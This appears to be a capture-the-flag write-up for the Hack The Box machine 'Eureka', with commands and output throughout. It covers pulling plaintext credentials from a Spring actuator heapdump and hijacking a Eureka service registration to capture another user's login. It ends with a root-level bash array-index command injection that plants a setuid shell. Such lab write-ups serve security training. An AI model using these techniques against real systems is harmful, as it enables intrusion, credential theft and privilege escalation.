---
name: Eureka
difficulty: hard
os: linux
platform: htb
date: 2025/08/15
releasedDate: 2099-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/721477107c34105c91220b678c1f1ec6.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.66 -o allPorts
```
```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
8761/tcp open  unknown syn-ack ttl 63
```
Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p 22,80,8761 -sCV 10.10.11.66 -o targeted
```
```
PORT   STATE SERVICE VERSION
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
8761/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title.
| http-auth: 
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We add dns resolution to our `/etc/hosts` file for easier access:
```bash
echo "10.10.11.66 eureka.htb furni.htb" | sudo tee -a /etc/hosts
```

We do a directory brute force using `gobuster` to find hidden directories on the web server:
```bash
gobuster dir -u http://furni.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200
```
```
/login                (Status: 200) [Size: 1550]
/register             (Status: 200) [Size: 9028]
/about                (Status: 200) [Size: 14351]
/contact              (Status: 200) [Size: 10738]
/services             (Status: 200) [Size: 14173]
/blog                 (Status: 200) [Size: 13568]
/shop                 (Status: 200) [Size: 12412]
/comment              (Status: 302) [Size: 0] [--> http://furni.htb/login]
/cart                 (Status: 302) [Size: 0] [--> http://furni.htb/login]
/logout               (Status: 200) [Size: 1159]
/checkout             (Status: 302) [Size: 0] [--> http://furni.htb/login]
/error                (Status: 500) [Size: 73]
```
All of them are accessible through the web page.

We try directory brute forcing using `dirsearch` to find hidden directories on the web server:
```bash
python3 dirsearch.py -u http://furni.htb/ -x 400 
```
```
  _|. _ _  _  _  _ _|_    v0.4.3                                                             
 (_||| _) (/_(_|| (_| )                                                                      
                                                                                             
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25
Wordlist size: 12292

Target: http://furni.htb/

[14:32:09] Scanning:                                                                         
[14:32:27] 200 -   14KB - /about                                            
[14:32:28] 200 -    2KB - /actuator                                         
[14:32:28] 200 -    20B - /actuator/caches                                  
[14:32:28] 200 -    6KB - /actuator/env                                     
[14:32:28] 200 -   467B - /actuator/features
[14:32:28] 200 -    15B - /actuator/health                                  
[14:32:28] 200 -     2B - /actuator/info                                    
[14:32:29] 200 -    3KB - /actuator/metrics                                 
[14:32:29] 200 -    54B - /actuator/scheduledtasks                          
[14:32:28] 200 -   36KB - /actuator/configprops                             
[14:32:29] 200 -   35KB - /actuator/mappings                                
[14:32:29] 405 -   114B - /actuator/refresh                                 
[14:32:28] 200 -   99KB - /actuator/loggers                                 
[14:32:28] 200 -  180KB - /actuator/conditions                              
[14:32:28] 200 -  198KB - /actuator/beans                                   
[14:32:29] 200 -  402KB - /actuator/threaddump                              
[14:32:28] 200 -   76MB - /actuator/heapdump                                
```
We find some actuator endpoints that may be useful for exploitation.

We download the file `/actuator/heapdump` and look for interesting strings:
```bash
wget http://furni.htb/actuator/heapdump -O heapdump.hprof
strings heapdump.hprof | grep -i 'passw'
strings heapdump.hprof | grep -i '8761'
```

```
{password=0sc@r190_S0l!dP@sswd, user=oscar190}!
http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka
```

We try to login with `EurekaSrvr:0scarPWDisTheB3st` on `http://eureka.htb:8761` and we see a Eureka Netflix Spring Cloud. 

We try to log in with `oscar190:0sc@r190_S0l!dP@sswd` on ssh `eureka.htb` and we get a shell.

## User Exploitation

We check for `sudo` privileges:
```bash
sudo -l
```
```
[sudo] password for oscar190: 
Sorry, user oscar190 may not run sudo on localhost.
```

We look for Eureka Netflix Spring Cloud vulnerabilities online. And we find this [https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka](https://engineering.backbase.com/2023/05/16/hacking-netflix-eureka).

We will add a new service instance of `USER-MANAGEMENT-SERVICE` and listen on port 8081.
```bash
curl -X POST http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE  -H 'Content-Type: application/json' -d '{ 
  "instance": {
    "instanceId": "USER-MANAGEMENT-SERVICE",
    "hostName": "10.10.14.216",
    "app": "USER-MANAGEMENT-SERVICE",
    "ipAddr": "10.10.14.216",
    "vipAddress": "USER-MANAGEMENT-SERVICE",
    "secureVipAddress": "USER-MANAGEMENT-SERVICE",
    "status": "UP",
    "port": {   
      "$": 8081,
      "@enabled": "true"
    },
    "dataCenterInfo": {
      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
      "name": "MyOwn"
    }
  }
}
'
```

We can use `nc` to listen on port 8081 and capture the traffic:

``` bash
nc -lvnp 8081
```
```
username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=T_ZeEBUEDlzQ-k6HIyeR02oreezhM3exMpf_90HYvUNRnJuxfs5vdHA8bDn9yH6_EQql41ofVNWDVkWcVq_Iw3G8jnQ3-qyA
```

We can reuse the found credentials (miranda-wise:IL!veT0Be&BeT0L0ve) to access ssh `eureka.htb`:

```bash
ssh miranda-wise@eureka.htb
whoami
```
```
miranda-wise
```

We find the user flag in home directory:
```bash
cat /home/miranda-wise/user.txt
```
```
user flag value
```

## Root Exploitation

We create a custom made process monitor, to see new processes in the system:
```bash
#!/bin/bash

INTERVAL=1
oldps=/tmp/oldps
newps=/tmp/newps
ps aux > $oldps

while true; do
        ps aux > $newps
        if diff -q $oldps $newps >/dev/null; then
                echo ""
        else
                diff $oldps $newps | grep ">"  | grep -v "ps aux" # solo los procesos nuevos
        fi
        sleep $INTERVAL
        cp $newps $oldps
done;
```
If we run the process monitor, we can see the following new processes being spawned:
```
root      185158  0.0  0.0   2608   596 ?        Ss   16:38   0:00 /bin/sh -c /opt/scripts/log_cleanup.sh
root      185160  0.0  0.0   2608   600 ?        S    16:38   0:00 /bin/sh /opt/scripts/log_cleanup.sh
root      185162  7.0  0.0   7024  3304 ?        S    16:38   0:00 /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
```

We find that `root` is running a custom made log analyser `/opt/log_analyse.sh`. 

If we look at the content of this script, we see there is a problem with `if [[ "$existing_code" -eq "$code" ]]; then`:
```bash
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```
If we can change the value of `code`, we will be able to execute arbitrary commands as root.

We can add a line to the log file (which will be processed by the log analysis script) with the desired command:
```
HTTP Status: fake_array[$(cp /bin/bash /tmp/pwn; chmod +s /tmp/pwn)]
```
This way, `$code` variable will contain `fake_array[$(<command>)]` and it will be treated as an array. Bash will execute the command inside the array to get the index value.

First, we have to delete the existing `/var/www/web/cloud-gateway/log/application.log` and create a new one with the same name, that way we can control the log content.
```bash
rm /var/www/web/cloud-gateway/log/application.log
echo 'HTTP Status: fake_array[$(cp /bin/bash /tmp/pwn; chmod +s /tmp/pwn)]' >> /var/www/web/cloud-gateway/log/application.log
```

Then we wait until root executes the log analysis script, which will process the log file and trigger our payload.

```bash
ls -l /tmp/pwn
```
```
-rwsr-sr-x 1 root root 1183448 Aug 16 17:48 /tmp/pwn*
```

Now, we can execute our payload with the following command:

```bash
/tmp/pwn -p
whoami
```
```
root
```

Finally, we can find the root flag in the root directory:
```bash
cat /root/root.txt
```
```
root flag value
```

## Conclusion

In this write-up, we have demonstrated the process of exploiting a vulnerable log analysis script to gain root access on the target machine. By carefully crafting our payload and manipulating the log file, we were able to escalate our privileges and ultimately retrieve the root flag. This exercise highlights the importance of secure coding practices and the need for thorough input validation in scripts that process user-generated content.
